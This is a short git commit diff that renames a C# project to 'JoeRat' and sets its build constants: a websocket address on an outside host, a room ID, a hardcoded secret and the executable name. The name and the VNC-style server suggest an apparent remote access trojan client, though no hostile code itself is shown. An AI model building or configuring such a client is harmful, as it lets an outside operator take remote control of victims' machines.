6bac73cf351e9c62ab908408c30917b66579b070
Lonhaax <ytng976@gmail.com>
2026-06-07 18:03:52 +0100

    chore: release JoeRat for room ops-room

--- csharpsender/CSharpSender/BuildConfig.cs
+++ csharpsender/CSharpSender/BuildConfig.cs
@@ -1,8 +1,8 @@
-namespace CSharpSender;
+namespace JoeRat;
 internal static class BuildConfig
 {
     public const string DefaultWsUrl  = "ws://vnc.jake.cash:3000";
-    public const string DefaultRoomId = "ops-roo";
+    public const string DefaultRoomId = "ops-room";
     public const string DefaultSecret = "boi123";
-    public const string ExeName       = "client";
+    public const string ExeName       = "JoeRat";
 }
